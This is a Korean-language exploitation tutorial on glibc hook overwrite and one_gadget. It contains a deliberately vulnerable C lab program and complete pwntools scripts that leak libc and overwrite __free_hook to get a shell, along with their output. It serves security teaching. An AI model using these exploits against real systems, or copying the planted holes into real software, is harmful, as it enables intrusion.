# Exploit Tech: Hook Overwrite

# 들어가며

## 서론

---

운영체제가 어떤 코드를 실행하려 할 때, 이를 낚아채어 다른 코드가 실행되게 하는 것을 Hooking(후킹)이라고 부르며, 이때 실행되는 코드를 Hook(훅)이라고 부른다.

후킹은 굉장히 다양한 용도로 사용된다. 함수에 훅을 심어서 함수의 호출을 모니터링 하거나, 함수에 기능을 추가할 수도 있고, 아니면 아예 다른 코드를 심어서 실행 흐름을 변조할 수도 있다.

본 강의에서는 크게 두 가지를 학습해볼 것이다. 첫 번째는 **훅 오버라이트(Hook Overwrite)**로, 훅의 특징을 이용한 공격 기법이다. Glibc 2.33 이하 버전에서 libc 데이터 영역에는 malloc()과 free()를 호출할 때 함께 호출되는 훅(Hook)이 함수 포인터 형태로 존재한다. 이 함수 포인터를 임의의 함수 주소로 오버라이트(Overwrite)하여 악의적인 코드를 실행하는 기법이다. Full RELRO가 적용되더라도 libc의 데이터 영역에는 쓰기가 가능하므로 Full RELRO를 우회하는 기법이다.

두 번째는 libc 내에 존재하는 가젯인 **원가젯(one-gadget)**이다. 기존에는 셸을 실행하려면 여러 개의 가젯을 조합하여 ROP chain을 구성했지만, 원가젯은 단일 가젯만으로도 셸을 실행할 수 있는 매우 강력한 가젯이다. 하지만 원가젯은 Glibc 버전마다 다르게 존재하며, 사용하기 위한 제약 조건도 모두 다르다. 일반적으로 Glibc 버전이 높아질수록 제약 조건을 만족하기가 어려워지는 특성이 있다.

## 실습 환경 Dockerfile

---

```c
FROM ubuntu:18.04

ENV PATH="${PATH}:/usr/local/lib/python3.6/dist-packages/bin"
ENV LC_CTYPE=C.UTF-8

RUN apt update
RUN apt install -y \
    gcc \
    git \
    python3 \
    python3-pip \
    ruby \
    sudo \
    tmux \
    vim \
    wget

# install pwndbg
WORKDIR /root
RUN git clone https://github.com/pwndbg/pwndbg
WORKDIR /root/pwndbg
RUN git checkout 2023.03.19
RUN ./setup.sh

# install pwntools
RUN pip3 install --upgrade pip
RUN pip3 install pwntools

# install one_gadget command
RUN gem install elftools -v 1.1.3 && gem install one_gadget -v 1.7.3

WORKDIR /root
```

```c
IMAGE_NAME=ubuntu1804 CONTAINER_NAME=my_container; \
docker build . -t $IMAGE_NAME; \
docker run -d -t --privileged --name=$CONTAINER_NAME $IMAGE_NAME; \
docker exec -it -u root $CONTAINER_NAME bash
```

# 메모리 함수 훅

## malloc, free, realloc hook

---

C 언어에서 메모리의 동적 할당과 해제를 담당하는 함수로는 malloc, free, realloc이 대표적이다.
각 함수는 libc.so에 구현되어 있다.

```c
$ readelf -s /lib/x86_64-linux-gnu/libc-2.27.so | grep -E "__libc_malloc|__libc_free|__libc_realloc"
   463: 00000000000970e0   923 FUNC    GLOBAL DEFAULT   13 __libc_malloc@@GLIBC_2.2.5
   710: 000000000009d100    33 FUNC    GLOBAL DEFAULT   13 __libc_reallocarray@@GLIBC_PRIVATE
  1619: 0000000000098ca0  1114 FUNC    GLOBAL DEFAULT   13 __libc_realloc@@GLIBC_2.2.5
  1889: 00000000000979c0  3633 FUNC    GLOBAL DEFAULT   13 __libc_free@@GLIBC_2.2.5
  1994: 000000000019a9d0   161 FUNC    GLOBAL DEFAULT   14 __libc_freeres@@GLIBC_2.2.5
```

libc에는 이 함수들의 디버깅 편의를 위해 훅 변수가 정의되어 있다. 프로그램에서 malloc이 어디서 몇 번 호출되었는지 추적하고 싶을 때 사용할 수 있다.

훅 변수를 이용하여 malloc 대신 __malloc_hook 변수가 가리키는 함수를 호출 할 수 있다. malloc 함수 내에서 __malloc_hook 변수가 NULL인지 확인하고, 만약 NULL이라면 malloc을 그대로 이용하고, NULL이 아니라면 __malloc_hook 변수가 가리키고 있는 함수를 호출하도록 한다.

이때 __malloc_hook 변수는 함수 포인터 변수이고 전역 변수이다. 전역 변수이기 때문에 .bss 혹은 .data 영역에 할당된다. 근데 .bss 혹은 .data 영역은 쓰기 권한이 존재하므로 공격 벡터로 이용된다.

### 훅의 위치와 권한

__malloc_hook, __free_hook, __realloc_hook은 관련된 함수들과 마찬가지로 libc.so 에 정의되어 있다.

```c
$ readelf -s /lib/x86_64-linux-gnu/libc-2.27.so | grep -E "__malloc_hook|__free_hook|__realloc_hook"
   221: 00000000003ed8e8     8 OBJECT  WEAK   DEFAULT   35 __free_hook@@GLIBC_2.2.5
  1132: 00000000003ebc30     8 OBJECT  WEAK   DEFAULT   34 __malloc_hook@@GLIBC_2.2.5
  1544: 00000000003ebc28     8 OBJECT  WEAK   DEFAULT   34 __realloc_hook@@GLIBC_2.2.5
```

이 변수들은 기능적으로 전역 변수일 수 밖에 없고, 다음과 같이 확인 할 수 있다.

이 변수들의 오프셋은 각각 0x3ed8e8, 0x3ebc30, 0x3ebc28인데, 섹션 헤더 정보를 참조하면 libc.so 의 bss 및 data 섹션에 포함됨을 알 수 있다. 

```c
$ readelf -S /lib/x86_64-linux-gnu/libc-2.27.so | grep -EA 1 "\.bss|\.data"
<-- skipped -->
  [34] .data             PROGBITS         00000000003eb1a0  001eb1a0
       00000000000016c0  0000000000000000  WA       0     0     32
  [35] .bss              NOBITS           00000000003ec860  001ec860
       0000000000004280  0000000000000000  WA       0     0     32
```

## Hook Overwrite

---

앞서 배운 정보를 종합해보면, malloc, free, realloc에는 각각에 대응되는 훅 변수가 존재하며, 앞서 설명한 바와 같이 이들은 libc의 bss 섹션에 위치하여 실행 중에 덮어쓰는 것이 가능하다. 또한, 훅을 실행할 때 기존 함수에 전달한 인자를 같이 전달해 주기 때문에 __malloc_hook을 system 함수의 주소로 덮고, malloc(”/bin/sh”)을 호출하여 셸을 획득하는 등의 공격이 가능하다.

아래 코드는 훅을 덮는 공격이 가능함을 보여준다.

```c
// Name: fho-poc.c
// Compile: gcc -o fho-poc fho-poc.c

#include <malloc.h>
#include <stdlib.h>
#include <string.h>

const char *buf="/bin/sh";

int main() {
  printf("\"__free_hook\" now points at \"system\"\n");
  __free_hook = (void *)system;
  printf("call free(\"/bin/sh\")\n");
  free(buf);
}

```

```c
$ ./fho-poc
"__free_hook" now points at "system"
call free("/bin/sh")
$ echo "This is Hook Overwrite!"
This is Hook Overwrite!
```

Full RELRO가 적용된 바이너리에도 라이브러리의 훅에는 쓰기 권한이 남아있기 때문에 이러한 공격을 고려해볼 수 있다.

앞서 살펴보았듯이 __free_hook이나 __malloc_hook과 같은 훅은 libc에 쓰기 권한으로 존재하는 함수포인터이며, 간접적으로 free()와 malloc()을 호출하여 손쉽게 실행이 가능하므로 공격에 악용되기 쉽다. 그뿐만 아니라 훅은 힙 청크 할당(malloc)과 해제(free)가 다발적으로 일어나는 환경에서 성능에 악영향을 주기 때문에 보안과 성능 향상을 이유로 Glibc 2.34 버전부터 제거되었다.

성능에 악영향을 주는 이유는 계속해서 if 문으로 포인터를 확인하므로 자주 호출하는 malloc이나 free 같은 함수의 오버헤드가 증가한다.

# Free Hook Overwrite

## Free Hook Overwrite

---

free 함수의 훅을 덮는 공격을 실습해보자.

```c
// Name: fho.c
// Compile: gcc -o fho fho.c

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
  char buf[0x30];
  unsigned long long *addr;
  unsigned long long value;

  setvbuf(stdin, 0, _IONBF, 0);
  setvbuf(stdout, 0, _IONBF, 0);

  puts("[1] Stack buffer overflow");
  printf("Buf: ");
  read(0, buf, 0x100);
  printf("Buf: %s\n", buf);

  puts("[2] Arbitrary-Address-Write");
  printf("To write: ");
  scanf("%llu", &addr);
  printf("With: ");
  scanf("%llu", &value);
  printf("[%p] = %llu\n", addr, value);
  *addr = value;

  puts("[3] Arbitrary-Address-Free");
  printf("To free: ");
  scanf("%llu", &addr);
  free(addr);

  return 0;
}

```

## 분석

---

### 보호 기법

checksec을 사용해서 fho 바이너리에 적용된 보호 기법을 살펴보면, 그동안 배운 모든 보호 기법이 적용되어 있음을 확인할 수 있다.

```c
$ checksec fho
[*] '/home/hhro/dreamhack/fho'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

### 코드 분석

- L16:L19 매우 큰 스택 버퍼 오버플로우가 발생한다. 그러나 알고 있는 정보가 없으므로 카나리를 올바르게 덮을 수도 없고, 반환 주소도 유의미한 값으로 조작할 수 없다. 스택에 있는 데이터를 읽는데 사용할 수 있다.
- L21:L27 주소를 입력하고, 그 주소에 임의의 값을 쓸 수 있다.
- L29:L32 주소를 입력하고, 그 주소의 메모리를 해제할 수 있다.

### 공격 수단

공격자는 다음 세 가지 수단(Primitive)을 이용하여 셸을 획득해야 한다.

1. 스택의 어떤 값을 읽을 수 있다.
2. 임의 주소에 임의 값을 쓸 수 있다.
3. 임의 주소를 해제할 수 있다.

## 설계

---

### 1. 라이브러리 변수 및 함수들의 주소 구하기

__free_hook, system 함수, “/bin/sh” 문자열은 libc 파일에 정의되어 있으므로, 주어진 libc 파일로부터 이들의 오프셋을 구할 수 있다.

```c
$ readelf -sr libc-2.27.so | grep " __free_hook@"
0000003eaef0  00dd00000006 R_X86_64_GLOB_DAT 00000000003ed8e8 __free_hook@@GLIBC_2.2.5 + 0
   221: 00000000003ed8e8     8 OBJECT  WEAK   DEFAULT   35 __free_hook@@GLIBC_2.2.5

__free_hook 오프셋 = 0x3ed8e8
```

```c
$ readelf -s libc-2.27.so | grep " system@"
  1403: 000000000004f550    45 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.2.5

system 함수 오프셋 = 0x4f550
```

```c
$ strings -tx libc-2.27.so | grep "/bin/sh"
 1b3e1a /bin/sh

"/bin/sh" 오프셋 = 0x1b3e1a
```

메모리 상에서 이들의 주소를 계산하려면, 프로세스에 매핑된 libc 파일의 베이스 주소를 알아야 한다. main 함수는 __libc_start_main 이라는 라이브러리 함수가 호출하므로 main 함수 스택 프레임의 반환 주소는 항상 libc의 주소가 있다.

```c
$ gdb ./fho
pwndbg> start
pwndbg> main
pwndbg> bt
#0  0x00005555555548be in main ()
#1  0x00007ffff7a05b97 in __libc_start_main (main=0x5555555548ba <main>, argc=1, argv=0x7fffffffc338, init=<optimized out>, fini=<optimized out>, rtld_fini=<optimized out>, stack_end=0x7fffffffc328) at ../csu/libc-start.c:310
#2  0x00005555555547da in _start ()
```

### 2. 셸 획득

앞서 익스플로잇에 필요한 변수와 함수의 주소를 구한 후 [2]에서 __free_hook의 값을 system 함수의 주소로 덮고, [3]에서 “/bin/sh”를 해제(free)하게 되면 셸을 획득할 수 있다.

## 익스플로잇

---

### 1. 라이브러리의 변수 및 함수들의 주소 구하기

__libc_start_main 함수에서 main 함수를 호출한다. 이때 바로 호출하는 것이 아닌 __libc_start_main 함수에서 진행중에 main 함수를 호출하는 것이므로 __libc_start_main 함수의 어느 부분으로 ret하는지 확인하고 이를 토대로 계산하여 libc 베이스 주소를 구할 수 있다.

먼저 다음과 같이 gdb로 바이너리를 열고 main 함수에 중단점을 설정한 후 실행한다. main 함수에서 멈췄을 때, 모든 스택 프레임의 백트레이스를 출력하는 bt 명령어로 main 함수의 반환 주소를 알아낼 수 있다.

```c
$ gdb fho
pwndbg> b *main
Breakpoint 1 at 0x8ba
pwndbg> r
pwndbg> bt
#0  0x00005625b14008ba in main ()
#1  0x00007f5ae2f1cc87 in __libc_start_main (main=0x5625b14008ba <main>, argc=1, argv=0x7ffdf39f3ed8, init=<optimized out>, fini=<optimized out>, rtld_fini=<optimized out>, stack_end=0x7ffdf39f3ec8) at ../csu/libc-start.c:310
#2  0x00005625b14007da in _start ()
pwndbg> x/i 0x00007f5ae2f1cc87
   0x7f5ae2f1cc87 <__libc_start_main+231>:  mov    edi,eax
pwndbg>
```

위 #1 부분에서 확인 할 수 있듯이 main 함수의 반환 주소는 0x00007f5ae2f1cc87이고, x/i로 출력해보면 __libc_start_main+231이다. __libc_start_main+231의 오프셋은 다음과 같이 readelf 명령어로도 얻을 수 있다.

```c
$ readelf -s libc-2.27.so | grep " __libc_start_main@"
  2203: 0000000000021b10   446 FUNC    GLOBAL DEFAULT   13 __libc_start_main@@GLIBC_2.2.5

--> __libc_start_main+231의 오프셋 = 0x21b10+231
```

따라서 main 함수의 반환 주소인 __libc_start_main+231를 릭한 후, 해당 값에서 0x21b10+231를 빼면 libc의 베이스 주소를 구할 수 있다.

```c
#!/usr/bin/env python3
# Name: fho.py

from pwn import *

p = process('./fho')
e = ELF('./fho')
libc = ELF('./libc-2.27.so')

def slog(name, addr): return success(': '.join([name, hex(addr)]))

# [1] Leak libc base
buf = b'A'*0x48
p.sendafter('Buf: ', buf)
p.recvuntil(buf)
libc_start_main_xx = u64(p.recvline()[:-1] + b'\x00'*2)
libc_base = libc_start_main_xx - (libc.symbols['__libc_start_main'] + 231)
# 또는 libc_base = libc_start_main_xx - libc.libc_start_main_return
system = libc_base + libc.symbols['system']
free_hook = libc_base + libc.symbols['__free_hook']
binsh = libc_base + next(libc.search(b'/bin/sh'))

slog('libc_base', libc_base)
slog('system', system)
slog('free_hook', free_hook)
slog('/bin/sh', binsh)
```

```c
$ export LD_PRELOAD=$(realpath ./libc-2.27.so)
$ python3 fho.py
[+] Starting local process './fho': pid 21353
[*] '/home/dreamhack/fho'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] '/home/dreamhack/libc-2.27.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] libc_base: 0x7f8dbfc35000
[+] system: 0x7f8dbfc844e0
[+] free_hook: 0x7f8dc00228e8
[+] /bin/sh: 0x7f8dbfde90fa
```

### 2. 셀 획득

구해낸 __free_hook, system 함수, “/bin/sh” 문자열의 주소를 이용하면 셸을 획득할 수 있다.

```c
#!/usr/bin/env python3
# Name: fho.py

from pwn import *

p = process('./fho')
e = ELF('./fho')
libc = ELF('./libc-2.27.so')

def slog(name, addr): return success(': '.join([name, hex(addr)]))

# [1] Leak libc base
buf = b'A'*0x48
p.sendafter('Buf: ', buf)
p.recvuntil(buf)
libc_start_main_xx = u64(p.recvline()[:-1] + b'\x00'*2)
libc_base = libc_start_main_xx - (libc.symbols['__libc_start_main'] + 231)
# 또는 libc_base = libc_start_main_xx - libc.libc_start_main_return
system = libc_base + libc.symbols['system']
free_hook = libc_base + libc.symbols['__free_hook']
binsh = libc_base + next(libc.search(b'/bin/sh'))

slog('libc_base', libc_base)
slog('system', system)
slog('free_hook', free_hook)
slog('/bin/sh', binsh)

# [2] Overwrite `free_hook` with `system`
p.recvuntil('To write: ')
p.sendline(str(free_hook).encode())
p.recvuntil('With: ')
p.sendline(str(system).encode())

# [3] Exploit
p.recvuntil('To free: ')
p.sendline(str(binsh).encode())

p.interactive()
```

```c
$ export LD_PRELOAD=$(realpath ./libc-2.27.so)
$ python3 fho.py
[+] Starting local process './fho': pid 22082
[*] '/home/dreamhack/fho'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] '/home/dreamhack/libc-2.27.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] libc_base: 0x7f8014cf2000
[+] system: 0x7f8014d414e0
[+] free_hook: 0x7f80150df8e8
[+] /bin/sh: 0x7f8014ea60fa
[*] Switching to interactive mode
$ id
uid=1000(dreamhack) gid=1000(dreamhack) groups=1000(dreamhack)
```

# +α, one_gadget

## one_gadget

---

원 가젯(one-gadget) 또는 magic_gadget은 실행하면 셸이 획득되는 코드 뭉치이다. 원 가젯은 libc의 버전마다 다르게 존재하며, 제약 조건도 모두 다르다. 

원 가젯은 함수에 인자를 전달하기 어려울 때 유용하게 활용할 수 있다. 예를 들어, __malloc_hook을 임의의 값으로 오버라이트 할 수 있지만, malloc의 인자에 적은 정수 밖에 입력할 수 없는 상황이라면 “/bin/sh” 문자열 주소를 인자로 전달하기 매우 어렵다. 이럴 때 제약 조건을 만족하는 원 가젯이 존재한다면, 이를 호출해서 셸을 획득할 수 있다.

__free_hook의 경우 인자가 포인터이기 때문에 “/bin/sh”를 넘겨 줄 수 있다. 하지만 __malloc_hook의 경우 인자로 정수가 들어가야하기 때문에 “/bin/sh” 같은 문자열을 넘겨 줄 수 없다. 이때 원가젯이 유용한 이유는, 원가젯은 인자와 상관없이 작동하기 때문에 인자에 숫자를 넣어도 아무 상관이 없다.

```c
$ one_gadget ./libc-2.27.so
0x4f3d5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL

0x4f432 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a41c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
```

constraints는 만족해야하는 제약 조건이다.

### one_gadget 실습

원가젯을 이용하여 익스플로잇 할 수 있다.

```c
#!/usr/bin/env python3
# Name: fho_og.py

from pwn import *

p = process('./fho')
e = ELF('./fho')
libc = ELF('./libc-2.27.so')

def slog(name, addr): return success(': '.join([name, hex(addr)]))

# [1] Leak libc base
buf = b'A'*0x48
p.sendafter('Buf: ', buf)
p.recvuntil(buf)
libc_start_main_xx = u64(p.recvline()[:-1] + b'\x00'*2)
libc_base = libc_start_main_xx - (libc.symbols['__libc_start_main'] + 231)
# 또는 libc_base = libc_start_main_xx - libc.libc_start_main_return
free_hook = libc_base + libc.symbols['__free_hook']
og = libc_base+0x4f432

slog('libc_base', libc_base)
slog('free_hook', free_hook)
slog('one-gadget', og)

# [2] Overwrite `free_hook` with `og`, one-gadget address
p.recvuntil('To write: ')
p.sendline(str(free_hook).encode())
p.recvuntil('With: ')
p.sendline(str(og).encode())

# [3] Exploit
p.recvuntil('To free: ')
p.sendline(str(0x31337).encode())

p.interactive()
```

0x31337은 아무 값이나 보내도 되는데 통상적으로 의미 없이 사용하는 숫자이다.